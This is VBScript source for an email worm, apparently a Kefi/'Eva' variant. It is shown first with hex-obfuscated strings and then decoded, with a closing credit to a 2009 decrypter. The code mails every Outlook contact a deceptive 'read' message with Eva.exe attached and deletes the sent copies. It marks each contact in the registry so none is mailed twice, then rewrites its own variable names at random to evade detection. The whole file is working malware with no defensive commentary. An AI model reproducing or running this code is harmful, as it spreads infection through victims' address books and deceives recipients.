   with wscript
    set wscshellobject = .createobject(vwear("787464736A71752F7469666D6D")) ' wscript.shell
    set ooo = .createobject(vwear("7076756D70706C2F6271716D6A6462756A706F")) ' outlook.application
    set fso = .createobject(vwear("7464736A71756A6F682F676A6D66747A7475666E70636B666475")) ' scripting.filesystemobject
    one = one + 1: if isobject(ooo) then
     with ooo
      for each addlist in .getnamespace(vwear("6E62716A")).addresslists ' mapi
       for addent = one to addlist.addressentries.count
        mkei = vwear("494C465A6044565353464F5560565446535D54706775786273665D4C66676A5D7763742F6677625D6E626A6D5D")
        'mkei = "HKEY_CURRENT_USER\Software\Kefi\vbs.eva\mail\"
        doneyet = wscshellobject.regread(mkei & addlist.addressentries(addent))
        if not doneyet like vwear("7562747566742B") then ' tastes*
         with .createitem(0 * rnd)
          .recipients.add addlist.addressentries(addent)
          .subject = vwear("73666265") ' read
          .body = vwear("49666D6D702D0E0B0E0B4A216962776621636664706E66216A6F67666475666521786A7569216221746A6D6D7A2177637430783433217870736E2F2F2F214A752874216E626C6A6F68216E662174666F6521667766737A706F6621666E626A6D7421786A7569216A752129756966217870736E2A2162757562646966652D217470214A21676A6876736665214A286521626F686673216A7521637A2174666F656A6F68216A75217570217A7076216E7A74666D672F2F2F0E0B0E0B437A6622")
          ' .body =
          ' Hello,

           ' I have become infected with a silly vbs/w32 worm... It's making me send everyone emails with it (the worm) attached, so I figured I'd anger it by sending it to you myself...

           ' Bye!
          .attachments.add fso.getspecialfolder(0) + vwear("5D4677622F667966") ' \Eva.exe
          .importance = one + one
          .deleteaftersubmit = one
          .send
         end with
         wscshellobject.regwrite mkei & addlist.addressentries(addent), vwear("7562747566742167766F6F7A") ' tastes funny
        end if
       next
      next
      .quit
     end with
    end if
    with fso
     mycode = .opentextfile(wscript.scriptfullname,1).readall
     somethings = array("wscshellobject","ooo","fso","char","one","addlist","vwear","addent","mkei","doneyet","mycode","thisone","somethings","icount","newword","shit","sh1","sh2")
     for each thisone in somethings
      newword = "":randomize
      for icount = one to 4 + int(7 * rnd)
       newword = newword & chr(97 + int(22 * rnd))
       if one + int(2 * rnd) = one then newword = newword & one + int(8 * rnd)
      next
      mycode = replace(mycode, thisone, newword)
     next
     .opentextfile(wscript.scriptfullname,2).write(mycode)
    end with
    .quit
   end with
   Function vwear(shit): one = one + 1
    For sh1 = one to Len(shit) step 2
     sh2=Mid(shit,sh1,2)
     vwear=vwear+Chr(Asc(Chr("&h" & sh2))-1)
    Next
   End Function

   ' Original Source Code

   with wscript
    set wscshellobject = .createobject("wscript.shell") ' wscript.shell
    set ooo = .createobject("outlook.application") ' outlook.application
    set fso = .createobject("scripting.filesystemobject") ' scripting.filesystemobject
    one = one + 1: if isobject(ooo) then
     with ooo
      for each addlist in .getnamespace("mapi").addresslists ' mapi
       for addent = one to addlist.addressentries.count
        mkei = "HKEY_CURRENT_USER\Software\Kefi\vbs.eva\mail\"
        'mkei = "HKEY_CURRENT_USER\Software\Kefi\vbs.eva\mail\"
        doneyet = wscshellobject.regread(mkei & addlist.addressentries(addent))
        if not doneyet like "tastes*" then ' tastes*
         with .createitem(0 * rnd)
          .recipients.add addlist.addressentries(addent)
          .subject = "read" ' read
          .body = "Hello," & vbcrlf & "I have become infected with a silly vbs/w32 worm... It's making me send everyone emails with it (the worm) attached, so I figured I'd anger it by sending it to you myself..." & vbcrlf & "Bye!"
          ' .body =
          ' Hello,

           ' I have become infected with a silly vbs/w32 worm... It's making me send everyone emails with it (the worm) attached, so I figured I'd anger it by sending it to you myself...

           ' Bye!
          .attachments.add fso.getspecialfolder(0) + "\Eva.exe" ' \Eva.exe
          .importance = one + one
          .deleteaftersubmit = one
          .send
         end with
         wscshellobject.regwrite mkei & addlist.addressentries(addent), "tastes funny" ' tastes funny
        end if
       next
      next
      .quit
     end with
    end if
    with fso
     mycode = .opentextfile(wscript.scriptfullname,1).readall
     somethings = array("wscshellobject","ooo","fso","char","one","addlist","vwear","addent","mkei","doneyet","mycode","thisone","somethings","icount","newword","shit","sh1","sh2")
     for each thisone in somethings
      newword = "":randomize
      for icount = one to 4 + int(7 * rnd)
       newword = newword & chr(97 + int(22 * rnd))
       if one + int(2 * rnd) = one then newword = newword & one + int(8 * rnd)
      next
      mycode = replace(mycode, thisone, newword)
     next
     .opentextfile(wscript.scriptfullname,2).write(mycode)
    end with
    .quit
   end with
   Function vwear(shit): one = one + 1
    For sh1 = one to Len(shit) step 2
     sh2=Mid(shit,sh1,2)
     vwear=vwear+Chr(Asc(Chr("&h" & sh2))-1)
    Next
   End Function

   'Decrypt by the VBS and VBA File Decrypter written by PetiK - 17/07/2009
